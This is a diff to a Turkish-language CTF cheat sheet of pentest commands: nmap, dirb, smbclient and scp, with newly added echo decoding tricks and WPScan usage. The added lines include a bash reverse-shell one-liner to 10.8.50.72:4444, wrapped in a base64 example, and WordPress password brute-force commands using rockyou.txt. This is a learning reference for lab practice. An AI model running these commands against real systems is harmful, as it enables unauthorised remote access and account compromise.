@@ -21,7 +21,6 @@ gcc -o örnek.c/py/rb
 python3 -m http.server
 
 # CTF'ler için basic NMAP komutu #
-
 nmap -sV -sC -A -T4 <ip.adress>
 
 # Dirb Örnek Basic Kullanım #
@@ -39,4 +38,19 @@ smbclient //<ip.adress>/<Bakmak istediğiniz dosyanın ismi>
 
 # SCP kullanımı #
 scp /root/37292.c <Kullanıcının ismi>@<ip.adress>:/tmp ---> Karşı tarafa ssh ile dosya aktarımı
+
+# ECHO kullanımları #
+echo -n "<Rot13-HasH>" | tr 'A-Za-z' 'N-ZA-Mn-za-m' ---> ROT13 hash decode
+echo -n "Base64-Hash" | base64 -d ---> Base64 Hash decode
+echo -n "Base64 Hash'e çevirmek istediğiniz kod. Örnek = (echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64) " | base64
+echo "<Yazmak istediğiniz şey >" > < İçine yazmak istediğiniz dosya/doküman>
+echo 1 > /proc/sys/net/ipv4/ip_forward ---> IP forward
+
+# WPSCAN Kulanımı #
+wpscan --url < URL > -e vp,u ---> '-e' = Enum || vp ---> Vulnerable plugins || u ---> Users
+wpscan --url < URL > --username elyana --password /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Manuel.
+wpscan --url jack.thm -e u -P /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Otomatik.
+
+
+ 
 
